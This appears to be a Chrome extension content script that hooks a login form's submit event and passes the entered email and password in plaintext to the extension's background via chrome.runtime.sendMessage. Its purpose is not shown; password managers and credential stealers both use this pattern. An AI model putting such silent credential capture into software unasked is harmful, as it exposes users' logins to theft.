function getLoginData() {
  const form = document.querySelector('#login_form');

  form && form.addEventListener('submit', function (e) {
    const form = $(e.currentTarget),
      password = form.find('[type="password"]'),
      username = form.find('[type="email"]');

    const data = {
      'password': password.val(),
      'username': username.val()
    };

    chrome.runtime.sendMessage({'name': 'login_submit', 'data': data});

  });
}

getLoginData();